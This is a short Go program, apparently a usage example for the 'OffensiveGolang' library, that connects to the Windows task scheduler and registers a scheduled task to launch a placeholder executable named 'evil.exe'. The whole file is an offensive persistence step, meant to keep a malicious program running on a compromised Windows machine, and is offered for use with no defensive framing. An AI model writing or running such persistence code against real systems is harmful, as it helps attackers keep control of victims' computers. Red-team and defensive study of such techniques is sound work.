package main

import persistance "github.com/MrTuxx/OffensiveGolang/pkg/persistence"

func main() {

	println("[+] Creating Task")
	connection := persistance.GetConnection()
	persistance.CreateExeScheduledTask(connection, `\NAME-TASK`, `C:\Path\evil.exe`)
	persistance.DisconnectConnection(connection)
	println("[+] Task Created")

}
